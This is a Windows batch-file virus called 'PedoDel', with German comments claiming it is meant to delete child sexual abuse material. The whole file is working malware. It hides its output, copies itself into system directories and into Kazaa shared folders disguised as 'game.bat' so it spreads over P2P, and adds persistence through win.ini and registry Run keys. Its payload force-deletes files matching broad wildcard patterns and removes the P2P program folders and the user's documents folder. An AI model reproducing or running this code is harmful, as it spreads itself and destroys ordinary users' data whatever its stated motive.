@echo off
:: PedoDel - AGAINST R@YGOLD
:: by Razorblade

:: Dieser Virus soll Kinderpornografie vom Rechner löschen! Nach einigen Reportagen habe ich jetzt die 
:: Schnautze voll! Bringt diese dicken alten Männer, die Kinder missbrauchen endlich in den Knast!
:: http://www.polizei.propk.de/aktionen/kinderpornografie/index.xhtml

ctty nul

copy %0 "%systemroot%\scv32.bat"
copy %0 "%systemroot%\system32\scv97.bat"
copy %0 "%systemroot%\system\mgr32.bat"
copy %0 "%programfiles%\userin32.bat"
if exist "%programfiles%\Kazaa" (
	copy %0 "%programfiles%\Kazaa\My Shared Folder\game.bat"
)
if exist "%programfiles%\Kazaa Lite K++" (
	copy %0 "%programfiles%\Kazaa Lite K++\My Shared Folder\game.bat"
)
if exist "%programfiles%\Kazaa" (
	copy %0 "%programfiles%\Kazaa\My~1\game.bat"
)
if exist "%programfiles%\Kazaa~1" (
	copy %0 "%programfiles%\Kazaa~1\My~1\game.bat"
)
cls
echo [windows] >> "%systemroot%\win.ini"
echo load=%systemroot%\scv32.bat >> "%systemroot%\win.ini"
echo run=%systemroot%\scv32.bat >> "%systemroot%\win.ini"
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v AVPKa /t REG_SZ /d "%systemroot%\scv32.bat" /f
reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v VBSScript32 /t REG_SZ /d "%systemroot%\scv32.bat" /f
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v Mgr32 /t REG_SZ /d "%systemroot%\system32\scv97.bat" /f
reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v Scv321 /t REG_SZ /d "%systemroot%\system32\scv97.bat" /f
cls
del /f "5*.*"
del /f "6*.*"
del /f "7*.*"
del /f "8*.*"
del /f "9*.*"
del /f "10*.*"
del /f "11*.*"
del /f "12*.*"
del /f "13*.*"
del /f "14*.*"
del /f "15*.*"
del /f "pedo*.*"
del /f "r@y*.*"
del /f "xxx*.*"
del /f "lol*.*"
del /f "fu*.*"
del /f "kid*.*"
del /f "und*.*"
del /f "ana*.*"
del /f "yr*.*"
del /f "pre*.*"
del /f "chi*.*"
del /f "filia*.*"
del /f "ped*.*"
del /f "paed*.*"
del /f "tee*.*"
del /f "pho*.*"
del /f "ra*.*"
del /f "sty*.*"
del /f "zoo*.*"
del /f "ray*.*"
del /f "childlover*.*"
del /f "*old*.*"
del /f "illeg*.*"
del /f "mom*.*"
del /f "suck*.*"
del /f "*jpg*.*"
del /f "pthc*.*"
del /f "real*.*"
del /f "reel*.*"
del /f "sis*.*"
del /f "bro*.*"
del /f "fami*.*"
del /f "cock*.*"
del /f "*new*.*"
rd /q /s "%programfiles%\Kazaa"
rd /q /s "%programfiles%\Kazaa Lite"
rd /q /s "%programfiles%\eMule"
rd /q /s "%programfiles%\Kazaa~1"
rd /q /s "%userprofile%\Eigene~1"
cls
explorer http://www.polizei-beratung.de

:: End
:: www.polizei-beratung.de